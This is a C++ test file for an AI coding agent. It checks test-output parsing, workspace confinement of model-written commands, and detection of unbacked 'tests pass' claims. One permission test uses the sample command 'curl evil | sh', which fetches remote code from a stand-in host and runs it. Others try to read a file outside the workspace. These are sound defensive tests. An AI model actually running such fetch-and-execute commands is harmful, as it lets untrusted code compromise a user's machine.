// Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
// SPDX-License-Identifier: MIT

#include "support/unique_temp.h"
#include <gtest/gtest.h>

#include <filesystem>
#include <fstream>

#include "../agents/gaiacode/check_runner.h"
#include "../agents/gaiacode/code_agent.h"
#include "../agents/gaiacpp/bash_tools.h"

using namespace gaia;
using namespace gaia::code;
namespace fs = std::filesystem;

namespace {

CheckResult parsed(const std::string& output, int exitCode = 0) {
    CheckResult r;
    r.exitCode = exitCode;
    parseCheckOutput(output, r);
    return r;
}

fs::path freshDir(const std::string& name) {
    const fs::path dir = fs::temp_directory_path() / testsupport::perProcess(name);
    fs::remove_all(dir);
    fs::create_directories(dir);
    return dir;
}

void writeFile(const fs::path& p, const std::string& text) {
    fs::create_directories(p.parent_path());
    std::ofstream(p, std::ios::binary) << text;
}

// A stand-in pytest in `dir` that prints `summary`; the command that runs it on this shell.
std::string fakePytest(const fs::path& dir, const std::string& summary = "3 passed in 0.01s") {
    writeFile(dir / "pytest", "#!/bin/sh\necho '" + summary + "'\n");
    fs::permissions(dir / "pytest", fs::perms::owner_all, fs::perm_options::add);
    writeFile(dir / "pytest.bat", "@echo " + summary + "\r\n");
    return BashTools::detectShell().empty() ? "pytest.bat" : "./pytest";
}

std::optional<TurnEvent> bashRun(const std::string& command, const std::string& stdoutText, int exitCode) {
    return CodeAgent::classify("bash_execute", {{"command", command}},
                               {{"stdout", stdoutText}, {"stderr", ""}, {"exit_code", exitCode}, {"timed_out", false}});
}

constexpr TurnEvent kEdit = TurnEvent::Edit;
constexpr TurnEvent kGreen = TurnEvent::TestsPassed;
constexpr TurnEvent kRed = TurnEvent::TestsFailed;

}  // namespace

// ---------------------------------------------------------------- parsing

TEST(GaiacodeChecks, ReadsPytestCounts) {
    const auto r = parsed("....F.\nFAILED tests/test_stats.py::test_mean - assert 2 == 3\n"
                          "1 failed, 5 passed, 2 skipped in 0.12s\n", 1);
    EXPECT_EQ(r.passed, 5);
    EXPECT_EQ(r.failed, 1);
    EXPECT_EQ(r.skipped, 2);
    ASSERT_EQ(r.failures.size(), 1u);
    EXPECT_EQ(r.failures[0], "tests/test_stats.py::test_mean");
    EXPECT_FALSE(r.green());
}

TEST(GaiacodeChecks, PytestErrorsCountAsFailures) {
    const auto r = parsed("3 passed, 1 error in 0.30s\n", 1);
    EXPECT_EQ(r.passed, 3);
    EXPECT_EQ(r.failed, 1);
}

TEST(GaiacodeChecks, ARunThatRanNoTestsIsNotGreen) {
    // #8682: a script that runs no tests must never read as a passing run.
    const auto none = parsed("no tests ran in 0.01s\n", 5);
    EXPECT_EQ(none.passed, 0);
    EXPECT_FALSE(none.green());
    EXPECT_FALSE(parsed("hello\n", 0).green());
}

TEST(GaiacodeChecks, ReadsUnittestCountsAndSkips) {
    const auto ok = parsed("......\n----\nRan 6 tests in 0.001s\n\nOK\n");
    EXPECT_EQ(ok.passed, 6);
    EXPECT_EQ(ok.failed, 0);
    EXPECT_TRUE(ok.green());
    const auto bad = parsed("Ran 6 tests in 0.001s\n\nFAILED (failures=1, errors=1)\n", 1);
    EXPECT_EQ(bad.passed, 4);
    EXPECT_EQ(bad.failed, 2);
    // Every test skipped is not a passing run.
    const auto skipped = parsed("Ran 3 tests in 0.001s\n\nOK (skipped=3)\n");
    EXPECT_EQ(skipped.passed, 0);
    EXPECT_FALSE(skipped.green());
}

TEST(GaiacodeChecks, AHugeCountIsClampedNotThrown) {
    const auto r = parsed("99999999999999999999 passed in 1s\n");
    EXPECT_GT(r.passed, 0);
}

TEST(GaiacodeChecks, ReadsCargoAcrossTestBinaries) {
    const auto r = parsed("test result: ok. 4 passed; 0 failed; 1 ignored\n"
                          "test result: FAILED. 2 passed; 1 failed; 0 ignored\n", 101);
    EXPECT_EQ(r.passed, 6);
    EXPECT_EQ(r.failed, 1);
    EXPECT_EQ(r.skipped, 1);
}

TEST(GaiacodeChecks, ReadsGoPackagesAndFailingTests) {
    const auto r = parsed("ok  \texample.com/a\t0.01s\n--- FAIL: TestParse (0.00s)\nFAIL\texample.com/b\t0.02s\n", 1);
    EXPECT_EQ(r.passed, 1);
    EXPECT_EQ(r.failed, 1);
    ASSERT_EQ(r.failures.size(), 1u);
    EXPECT_EQ(r.failures[0], "TestParse");
}

TEST(GaiacodeChecks, ReadsJestCounts) {
    const auto r = parsed("Tests:       1 failed, 2 skipped, 9 passed, 12 total\n", 1);
    EXPECT_EQ(r.passed, 9);
    EXPECT_EQ(r.failed, 1);
    EXPECT_EQ(r.skipped, 2);
}

TEST(GaiacodeChecks, ReadsCtestCountsAndNames) {
    const auto r = parsed("75% tests passed, 1 tests failed out of 4\n\nThe following tests FAILED:\n"
                          "\t  3 - parser_test (Failed)\n", 8);
    EXPECT_EQ(r.passed, 3);
    EXPECT_EQ(r.failed, 1);
    ASSERT_EQ(r.failures.size(), 1u);
    EXPECT_EQ(r.failures[0], "parser_test");
}

// ---------------------------------------------------------------- detection

TEST(GaiacodeChecks, FindsTheProjectsRunner) {
    const fs::path py = freshDir("gaiacode-detect-py");
    writeFile(py / "tests" / "test_stats.py", "def test_x():\n    assert True\n");
    EXPECT_NE(detectCheckCommand(py).find("-m pytest"), std::string::npos);

    const fs::path go = freshDir("gaiacode-detect-go");
    writeFile(go / "go.mod", "module example.com/x\n");
    EXPECT_EQ(detectCheckCommand(go), "go test ./...");

    const fs::path node = freshDir("gaiacode-detect-node");
    writeFile(node / "package.json", R"({"scripts":{"test":"vitest run"}})");
    EXPECT_EQ(detectCheckCommand(node), "npm test");

    const fs::path placeholder = freshDir("gaiacode-detect-placeholder");
    writeFile(placeholder / "package.json",
              R"({"scripts":{"test":"echo \"Error: no test specified\" && exit 1"}})");
    EXPECT_EQ(detectCheckCommand(placeholder), "");

    const fs::path empty = freshDir("gaiacode-detect-empty");
    EXPECT_EQ(detectCheckCommand(empty), "");
    for (const auto& d : {py, go, node, placeholder, empty}) fs::remove_all(d);
}

TEST(GaiacodeChecks, KnowsATestCommandFromAnotherCommand) {
    EXPECT_TRUE(looksLikeTestCommand("python -m pytest -q"));
    EXPECT_TRUE(looksLikeTestCommand("cd app && npm test"));
    EXPECT_TRUE(looksLikeTestCommand("go test ./..."));
    EXPECT_TRUE(looksLikeTestCommand("cargo test --all"));
    EXPECT_TRUE(looksLikeTestCommand("./pytest -q"));
    EXPECT_TRUE(looksLikeTestCommand("CI=1 npx jest --ci"));
    EXPECT_FALSE(looksLikeTestCommand("python test_stats.py"));  // #8682: a script, not a test run
    EXPECT_FALSE(looksLikeTestCommand("cat tests/test_stats.py"));
    // The runner has to be the program run, not a word in the command.
    EXPECT_FALSE(looksLikeTestCommand("grep passed pytest.log"));
    EXPECT_FALSE(looksLikeTestCommand("cat pytest.ini"));
    EXPECT_FALSE(looksLikeTestCommand("pip install pytest"));
}

TEST(GaiacodeChecks, RunChecksInAFolderPutsTheShellBack) {
    const fs::path dir = freshDir("gaiacode-run-checks-folder");
    fs::create_directories(dir / "pkg");
    const std::string command = fakePytest(dir / "pkg");
    auto session = std::make_shared<ShellSession>(dir.u8string());
    // A command first, so the shell reports its own form of the folder (/c/... under Git Bash).
    session->run("echo ready", 10000);
    const std::string before = session->cwd();

    const json out = runChecksTool(session, nullptr).callback({{"command", command}, {"path", "pkg"}});
    EXPECT_TRUE(out.value("green", false)) << out.dump();
    auto native = [](std::string p) {  // Git Bash reports /c/...; the restore sets C:/...
        if (p.size() >= 3 && p[0] == '/' && std::isalpha(static_cast<unsigned char>(p[1])) && p[2] == '/') {
            p = std::string(1, p[1]) + ":" + p.substr(2);
        }
        return fs::u8path(p);
    };
    std::error_code ec;
    EXPECT_TRUE(fs::equivalent(native(session->cwd()), native(before), ec))
        << session->cwd() << " vs " << before << ": the shell is back where it was";
    fs::remove_all(dir);
}

TEST(GaiacodeChecks, RunChecksReportsWhatATestCommandPrinted) {
    const fs::path dir = freshDir("gaiacode-run-checks");
    auto session = std::make_shared<ShellSession>(dir.u8string());
    const ToolInfo tool = runChecksTool(session, nullptr);
    EXPECT_EQ(tool.policy, ToolPolicy::CONFIRM);

    const json out = tool.callback({{"command", fakePytest(dir)}});
    EXPECT_EQ(out.value("status", ""), "success") << out.dump();
    EXPECT_EQ(out.value("passed", -1), 3);
    EXPECT_EQ(out.value("failed", -1), 0);
    EXPECT_TRUE(out.value("test_run", false));
    EXPECT_TRUE(out.value("green", false));

    const json none = tool.callback(json::object());
    EXPECT_EQ(none.value("status", ""), "error");
    EXPECT_NE(none.value("error", "").find("No test runner found"), std::string::npos);
    fs::remove_all(dir);
}

TEST(GaiacodeChecks, ACommandThatIsNotATestRunIsNeverGreen) {
    // #8682 again: `python test_stats.py` printing "3 passed" is not a test run.
    const fs::path dir = freshDir("gaiacode-run-checks-script");
    auto session = std::make_shared<ShellSession>(dir.u8string());
    const json out = runChecksTool(session, nullptr).callback({{"command", "echo 3 passed"}});
    EXPECT_FALSE(out.value("test_run", true));
    EXPECT_FALSE(out.value("green", true));
    EXPECT_FALSE(CodeAgent::classify("run_checks", {{"command", "echo 3 passed"}}, out).has_value());
    fs::remove_all(dir);
}

TEST(GaiacodeChecks, AModelWrittenCommandIsConfinedLikeTheShell) {
    const fs::path dir = freshDir("gaiacode-run-checks-confined");
    auto session = std::make_shared<ShellSession>(dir.u8string());
    auto ws = std::make_shared<const Workspace>(std::vector<std::string>{dir.u8string()});
    const ToolInfo tool = runChecksTool(session, ws);
    // The same rule as bash_execute: a command naming a folder outside the workspace is refused.
    // Under the home folder: the workspace rules let commands reach the system temp folders.
    const fs::path home = fs::u8path(getEnvVar("HOME", getEnvVar("USERPROFILE")));
    const fs::path other = home / testsupport::perProcess("gaiacode-run-checks-outside");
    fs::remove_all(other);
    fs::create_directories(other);
    writeFile(other / "secret.txt", "not yours");
    const std::string reader = BashTools::detectShell().empty() ? "type " : "cat ";
    const json out = tool.callback({{"command", reader + (other / "secret.txt").u8string()}});
    EXPECT_EQ(out.value("status", ""), "error") << out.dump();
    const json path = tool.callback({{"path", other.u8string()}});
    EXPECT_EQ(path.value("status", ""), "error") << path.dump();
    fs::remove_all(dir);
    fs::remove_all(other);
}

// ---------------------------------------------------------------- what a tool call did

TEST(GaiacodeEvents, EditsTestRunsAndReadsAreToldApart) {
    EXPECT_EQ(CodeAgent::classify("file_edit", json::object(), {{"status", "success"}}), kEdit);
    EXPECT_FALSE(CodeAgent::classify("file_edit", json::object(), {{"status", "error"}, {"error", "x"}}).has_value());
    EXPECT_EQ(bashRun("python -m pytest -q", "4 passed in 0.10s\n", 0), kGreen);
    EXPECT_EQ(bashRun("python -m pytest -q", "1 failed, 3 passed in 0.10s\n", 1), kRed);
    EXPECT_EQ(bashRun("sed -i s/a/b/ stats.py", "", 0), kEdit) << "a shell edit is an edit";
    EXPECT_FALSE(bashRun("ls", "stats.py\n", 0).has_value()) << "a read is nothing";
}

// ---------------------------------------------------------------- the claim check

TEST(GaiacodeClaims, RecognisesHowAModelSaysItPassed) {
    for (const char* claim : {"The tests now pass.", "All 12 tests pass.", "Tests are passing.",
                              "14 passed, 0 failed.", "pytest: 14 passed.", "Everything passes.",
                              "The build succeeds and the tests pass.", "The failing test now passes.",
                              "All 12 tests pass; I didn't change the API."}) {
        EXPECT_TRUE(CodeAgent::claimsTestsPass(claim)) << claim;
    }
}

TEST(GaiacodeClaims, LeavesHonestAnswersAlone) {
    for (const char* honest : {"The tests don't pass yet: one still fails.", "I could not run the tests.",
                               "Renamed the function in three files.", "12 passed, 2 failed.",
                               "Added a test that checks parse() succeeds on empty input.",
                               "The test passes a mock client to the handler."}) {
        EXPECT_FALSE(CodeAgent::claimsTestsPass(honest)) << honest;
    }
}

TEST(GaiacodeClaims, OnlyAGreenRunAfterTheLastEditBacksTheClaim) {
    const std::string claim = "Fixed the mean. The tests now pass.";
    EXPECT_TRUE(CodeAgent::testClaimNote(claim, {kEdit}).has_value());
    EXPECT_FALSE(CodeAgent::testClaimNote(claim, {kEdit, kGreen}).has_value());
    EXPECT_TRUE(CodeAgent::testClaimNote(claim, {kGreen, kEdit}).has_value()) << "green before the last edit";
    EXPECT_TRUE(CodeAgent::testClaimNote(claim, {kEdit, kRed}).has_value());
    EXPECT_TRUE(CodeAgent::testClaimNote(claim, {kEdit, kGreen, kRed}).has_value()) << "the last run decides";
    EXPECT_FALSE(CodeAgent::testClaimNote("Renamed it.", {kEdit}).has_value()) << "no claim, no note";
}


// ---------------------------------------------------------------- full-review fixes

TEST(GaiacodeChecks, ReadsTheOtherRunnersItRecognises) {
    CheckResult r = parsed("\n  12 passing (40ms)\n  2 pending\n");
    EXPECT_EQ(r.passed, 12);
    EXPECT_EQ(r.failed, 0);
    r = parsed("\n  10 passing (40ms)\n  1 failing\n", 1);
    EXPECT_EQ(r.failed, 1);
    r = parsed("Finished in 0.1 seconds\n7 examples, 1 failure, 2 pending\n", 1);
    EXPECT_EQ(r.passed, 4);
    EXPECT_EQ(r.failed, 1);
    EXPECT_TRUE(parsed("OK (5 tests, 9 assertions)\n").green());
    r = parsed("Tests: 6, Assertions: 9, Failures: 1, Errors: 1.\n", 1);
    EXPECT_EQ(r.failed, 2);
    r = parsed("Tests run: 2, Failures: 0, Errors: 0, Skipped: 0\nResults:\nTests run: 9, Failures: 1, Errors: 0, "
               "Skipped: 2\n",
               1);
    EXPECT_EQ(r.passed, 6) << "maven's totals are the last line";
    EXPECT_EQ(r.failed, 1);
    EXPECT_TRUE(parsed("Passed!  - Failed:     0, Passed:     5, Skipped:     0, Total:     5\n").green());
    r = parsed("Executed 5 tests, with 1 failure (0 unexpected) in 0.1 seconds\n", 1);
    EXPECT_EQ(r.failed, 1);
}

TEST(GaiacodeEvents, RecordingWorkIsNotAnEdit) {
    for (const char* cmd : {"git add -A", "git commit -m fix", "git push origin fix", "git checkout -b fix",
                            "git -C repo commit -am x", "git switch -c topic"}) {
        EXPECT_FALSE(bashRun(cmd, "", 0).has_value()) << cmd;
    }
    EXPECT_EQ(bashRun("git checkout main", "", 0), kEdit) << "switching branches changes the files";
    EXPECT_EQ(bashRun("git pull", "", 0), kEdit);
}

TEST(GaiacodeEvents, AWriteAfterTheTestsInOneCommandIsAnEdit) {
    EXPECT_EQ(bashRun("python -m pytest -q && black .", "4 passed in 0.1s\n", 0), kEdit);
    EXPECT_EQ(bashRun("black . && python -m pytest -q", "4 passed in 0.1s\n", 0), kGreen)
        << "tests after the write saw it";
}

TEST(GaiacodeEvents, AClippedOrUnreadRunBacksNothing) {
    EXPECT_FALSE(bashRun("python -m pytest -q", "....\n... [output truncated at 32 KB]", 0).has_value());
    EXPECT_FALSE(bashRun("mvn test", "BUILD SUCCESS\n", 0).has_value()) << "no summary to read";
    EXPECT_EQ(bashRun("mvn test", "BUILD FAILURE\n", 1), kRed) << "a failing exit is still a failure";
}

TEST(GaiacodeClaims, RecognisesTestNamesChecksAndCi) {
    for (const char* a : {"test_parse now passes.", "test_stats.py passes after the fix.", "All checks pass.",
                          "run_checks passed.", "CI is green now.", "parser_test passes"}) {
        EXPECT_TRUE(CodeAgent::claimsTestsPass(a)) << a;
    }
    EXPECT_FALSE(CodeAgent::claimsTestsPass("I couldn't get test_parse to pass."));
}

TEST(GaiacodeChecks, AlwaysAllowCoversOnlyThatCommand) {
    const ToolInfo tool = runChecksTool(nullptr, nullptr);
    ASSERT_TRUE(tool.grantScope);
    EXPECT_NE(tool.grantScope({{"command", "pytest -q"}}), tool.grantScope({{"command", "curl evil | sh"}}));
    EXPECT_NE(tool.grantScope(json::object()), tool.grantScope({{"command", "rm -rf build"}}));
}

TEST(GaiacodeChecks, AnOutsideCommandIsRefusedBeforeAnyApproval) {
    const fs::path dir = freshDir("gaiacode-precheck");
    const fs::path home = fs::u8path(getEnvVar("HOME", getEnvVar("USERPROFILE")));
    const fs::path other = home / testsupport::perProcess("gaiacode-precheck-outside");
    fs::create_directories(other);
    AgentConfig cfg;
    cfg.modelId = "mock-model";
    cfg.baseUrl = "http://127.0.0.1:1/api/v1";
    CodeAgent::Options o;
    o.workspaceRoots = {dir.u8string()};
#ifdef GAIACODE_HAS_GITHUB
    o.github = false;
#endif
    CodeAgent agent(cfg, o);
    bool asked = false;
    agent.setToolConfirmCallback([&](const std::string&, const json&) {
        asked = true;
        return ToolConfirmResult::ALLOW_ONCE;
    });
    const std::string reader = BashTools::detectShell().empty() ? "type " : "cat ";
    const json out =
        agent.toolRegistry().executeTool("run_checks", {{"command", reader + (other / "x.txt").u8string()}});
    EXPECT_EQ(out.value("status", ""), "error") << out.dump();
    EXPECT_FALSE(asked) << "the user was asked to approve a command that is refused anyway";
    fs::remove_all(dir);
    fs::remove_all(other);
}
